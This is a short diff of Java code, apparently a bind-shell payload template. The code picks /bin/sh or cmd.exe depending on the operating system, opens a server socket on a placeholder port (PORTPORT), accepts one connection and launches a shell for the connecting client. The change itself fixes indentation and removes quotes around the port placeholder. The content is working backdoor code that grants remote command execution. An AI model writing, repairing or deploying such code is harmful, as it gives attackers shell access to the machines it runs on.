@@ -44,13 +44,13 @@
   try
   {
     String ShellPath;
-if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
-  ShellPath = new String("/bin/sh");
-} else {
-  ShellPath = new String("cmd.exe");
-}
+    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+        ShellPath = new String("/bin/sh");
+    } else {
+        ShellPath = new String("cmd.exe");
+    }
 
-    ServerSocket server_socket = new ServerSocket( "PORTPORT" );
+    ServerSocket server_socket = new ServerSocket( PORTPORT );
     Socket client_socket = server_socket.accept();
     server_socket.close();
     Process process = Runtime.getRuntime().exec( ShellPath );
